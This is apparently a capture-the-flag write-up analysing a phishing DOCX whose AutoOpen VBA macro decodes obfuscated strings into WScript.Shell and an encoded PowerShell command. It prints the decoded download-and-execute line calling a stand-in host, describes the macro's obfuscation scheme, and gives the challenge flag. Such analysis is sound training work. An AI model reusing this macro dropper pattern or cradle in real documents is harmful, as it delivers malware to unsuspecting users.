# New Email — 100pt — Mixed Offensive

URL: https://ranges.io/event/bf72b90c-2149-11f1-9ad7-316439613462/challenge/49ea7aac-56b0-11f1-9414-646231653833

## Briefing
IT sent us an email with instructions for a new login page of some sort.  
We should get right on it an check it out, no time to slack at work.  
The file is ready for download below and the password is `infected`.

## Artifact
`New Outlook Login.docx` (inside `New Outlook Login.zip`, password `infected`).

## Approach
1. Unzip → DOCX with `word/vbaProject.bin` (macros).
2. `olevba` extracts the VBA:
   - `AutoOpen → kL5G1OWJN`
   - `Set obj = CreateObject(rghArP85CL("ivPlUuC4dhzSqPBW+PpfXQ=="))`
   - `obj.Run rghArP85CL("uK3RX6K1WVa4LlpV4CVSF7ii8RFosWBUmKygUECl…")`
3. `rghArP85CL(s)`:
   - base64-decode `s`
   - `H0b8b7pLY`: 4-byte block transform — read LE 32-bit, apply `hRmz`, write LE
   - `hRmz`: classic Bruce Schneier "TEA-like" Feistel inverse with constants `0x550555`, `0xCCCC`, shifts `7`, `14`
   - strip trailing `~` bytes
4. Python emulator in `solve.py` matches the VBA's logical/rotate shifts (treating 32-bit unsigned because the inputs come from byte values, no sign-bit edge cases).

## Decoded
- `CreateObject(...)` → `WScript.Shell`
- `.Run "powershell.exe -enc <b64>"`
- decoded UTF-16LE:
  ```
  iex ((New-Object Net.WebClient).DownloadString(
        'http://ctf.evil/mne{0bfu5c473d_vb4_n3v3r_6375_0ld}'))
  ```

## Flag
`mne{0bfu5c473d_vb4_n3v3r_6375_0ld}`
